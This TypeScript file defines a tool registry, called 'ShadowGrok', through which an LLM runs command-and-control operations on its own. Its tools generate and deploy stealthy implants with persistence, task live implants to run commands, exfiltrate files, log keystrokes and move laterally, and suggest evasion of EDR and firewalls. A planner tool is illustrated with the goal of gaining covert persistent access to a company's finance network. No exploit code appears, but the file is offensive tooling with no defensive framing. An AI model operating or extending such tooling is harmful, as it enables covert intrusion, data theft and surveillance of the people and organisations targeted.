// ShadowGrok C2 Tool Registry
// Production-ready tool definitions for autonomous C2 operations via xAI Grok API

export const SHADOWGROK_TOOLS = [
  {
    type: "function",
    function: {
      name: "generate_stealth_implant_config",
      description: "Generate a fully customized Go implant config with advanced stealth features (anti-analysis, traffic blending, jitter, encryption). Returns ready-to-compile JSON config.",
      parameters: {
        type: "object",
        properties: {
          target_os: { 
            type: "string", 
            enum: ["windows", "linux", "darwin"], 
            description: "Target operating system" 
          },
          stealth_level: { 
            type: "string", 
            enum: ["standard", "high", "maximum"], 
            default: "high",
            description: "Level of stealth features to include"
          },
          traffic_blend_profile: { 
            type: "string", 
            description: "Traffic profile to mimic e.g. 'spotify', 'discord', 'corporate_vpn', 'youtube'" 
          },
          custom_jitter_ms: { 
            type: "string", 
            description: "Jitter range e.g. '600-1800'" 
          },
          enable_persistence: { 
            type: "boolean", 
            default: true,
            description: "Enable persistence mechanisms" 
          },
          kill_switch_trigger: { 
            type: "string", 
            description: "Kill switch trigger e.g. '72h_no_beacon' or 'specific_date'" 
          }
        },
        required: ["target_os"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "compile_and_deploy_implant",
      description: "Compile the Go implant binary with the provided config, sign it if possible, and deploy to the specified node via the panel's build service. Returns deployment status and implant ID.",
      parameters: {
        type: "object",
        properties: {
          node_id: { 
            type: "string", 
            description: "Target node ID from database" 
          },
          config: { 
            type: "object", 
            description: "Full implant config object from generate_stealth_implant_config" 
          },
          build_flags: { 
            type: "array", 
            items: { type: "string" }, 
            description: "Build flags e.g. ['-tags=stealth', '-ldflags=-s -w']" 
          },
          auto_start: { 
            type: "boolean", 
            default: true,
            description: "Automatically start implant after deployment" 
          }
        },
        required: ["node_id", "config"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "send_c2_task_to_implant",
      description: "Send a task (command execution, file exfil, screenshot, keylog, lateral movement, self-destruct) to one or more live implants. Supports batching.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { 
            type: "array", 
            items: { type: "string" },
            description: "Array of implant IDs to send task to" 
          },
          task_type: { 
            type: "string", 
            enum: ["exec", "download", "upload", "screenshot", "keylog", "lateral", "persist", "self_destruct", "recon"],
            description: "Type of C2 task to execute" 
          },
          payload: { 
            type: "object", 
            description: "Task-specific parameters (command, url, file path, etc.)" 
          },
          timeout_seconds: { 
            type: "number", 
            default: 300,
            description: "Task timeout in seconds" 
          }
        },
        required: ["implant_ids", "task_type"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "query_implant_status",
      description: "Query real-time status, last beacon time, active tasks, and health of one or more implants. Returns detailed JSON report.",
      parameters: {
        type: "object",
        properties: {
          implant_ids: { 
            type: "array", 
            items: { type: "string" },
            description: "Array of implant IDs to query" 
          },
          include_traffic_stats: { 
            type: "boolean", 
            default: true,
            description: "Include traffic statistics in response" 
          }
        },
        required: ["implant_ids"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "trigger_kill_switch",
      description: "Trigger kill switch on implants, nodes, or globally. Supports graceful, immediate, or scheduled modes with confirmation. HIGH RISK - requires approval for global/immediate modes.",
      parameters: {
        type: "object",
        properties: {
          scope: { 
            type: "string", 
            enum: ["implant", "node", "global", "operation"],
            description: "Scope of kill switch" 
          },
          target_ids: { 
            type: "array", 
            items: { type: "string" },
            description: "Target IDs for implant/node scope" 
          },
          mode: { 
            type: "string", 
            enum: ["immediate", "graceful", "scheduled", "dead_man"],
            description: "Kill switch mode" 
          },
          reason: { 
            type: "string", 
            description: "Reason for triggering kill switch" 
          },
          confirmation_code: { 
            type: "string", 
            description: "Required for global/immediate to prevent accidents" 
          }
        },
        required: ["scope", "mode"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "analyze_traffic_and_suggest_evasion",
      description: "Analyze current Hysteria 2 traffic patterns + external threat intel and return specific recommendations for better blending or new obfuscation techniques.",
      parameters: {
        type: "object",
        properties: {
          node_id: { 
            type: "string",
            description: "Node ID to analyze traffic for" 
          },
          time_window_hours: { 
            type: "number", 
            default: 24,
            description: "Time window in hours for traffic analysis" 
          },
          threat_model: { 
            type: "string", 
            description: "Threat model e.g. 'corporate_edr', 'national_firewall', 'isp_dpi'" 
          }
        },
        required: ["node_id"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "orchestrate_full_operation",
      description: "High-level planner. Takes a natural language operation goal and returns a full phased plan with tool calls for each phase. Use for complex campaigns.",
      parameters: {
        type: "object",
        properties: {
          operation_goal: { 
            type: "string", 
            description: "Operation goal e.g. 'Establish persistent access in Acme Corp finance network with minimal detection risk'" 
          },
          constraints: { 
            type: "array", 
            items: { type: "string" },
            description: "Operational constraints e.g. 'no weekends', 'max bandwidth 1GB'" 
          },
          max_phases: { 
            type: "number", 
            default: 6,
            description: "Maximum number of operation phases" 
          }
        },
        required: ["operation_goal"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "run_panel_command",
      description: "Execute a shell command on the ShadowGrok panel server (e.g. restart Hysteria, rebuild Docker, rotate tokens). HIGH RISK — use with extreme caution and approval.",
      parameters: {
        type: "object",
        properties: {
          command: { 
            type: "string", 
            description: "Shell command to run" 
          },
          working_dir: { 
            type: "string", 
            default: "/home/workdir",
            description: "Working directory for command execution" 
          },
          require_approval: { 
            type: "boolean", 
            default: true,
            description: "Require admin approval before execution" 
          },
          timeout: { 
            type: "number", 
            default: 30,
            description: "Timeout in seconds" 
          }
        },
        required: ["command"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "update_node_config",
      description: "Dynamically update Hysteria 2 server config on a node (ports, obfuscation, auth, rate limits, etc.) and hot-reload if supported.",
      parameters: {
        type: "object",
        properties: {
          node_id: { 
            type: "string",
            description: "Node ID to update config for" 
          },
          config_patch: { 
            type: "object", 
            description: "Partial Hysteria YAML config to merge" 
          },
          hot_reload: { 
            type: "boolean", 
            default: true,
            description: "Hot-reload config after update" 
          }
        },
        required: ["node_id", "config_patch"]
      }
    }
  },

  {
    type: "function",
    function: {
      name: "query_hysteria_traffic_stats",
      description: "Fetch live traffic stats, connection counts, bandwidth from the Hysteria Traffic Stats API for a node or globally.",
      parameters: {
        type: "object",
        properties: {
          node_id: { 
            type: "string",
            description: "Node ID to query stats for (empty for global)" 
          },
          metric: { 
            type: "string", 
            enum: ["connections", "bandwidth", "uptime", "all"],
            default: "all",
            description: "Specific metric to query" 
          }
        },
        required: []
      }
    }
  },

  {
    type: "function",
    function: {
      name: "list_active_implants",
      description: "List all active implants with their status, last beacon time, and associated nodes.",
      parameters: {
        type: "object",
        properties: {
          status_filter: { 
            type: "string", 
            enum: ["active", "inactive", "all"],
            default: "all",
            description: "Filter implants by status" 
          },
          limit: { 
            type: "number", 
            default: 50,
            description: "Maximum number of implants to return" 
          }
        },
        required: []
      }
    }
  },

  {
    type: "function",
    function: {
      name: "assess_opsec_risk",
      description: "Assess operational security risk before executing an action. Returns risk score and recommendations.",
      parameters: {
        type: "object",
        properties: {
          action_type: { 
            type: "string",
            description: "Type of action being performed e.g. 'deploy_implant', 'send_task', 'update_config'" 
          },
          target_scope: { 
            type: "string",
            description: "Scope of targets e.g. 'single_node', 'multiple_nodes', 'global'" 
          },
          context: { 
            type: "object",
            description: "Additional context for risk assessment" 
          }
        },
        required: ["action_type", "target_scope"]
      }
    }
  }
] as const;

export type ShadowGrokTool = typeof SHADOWGROK_TOOLS[number];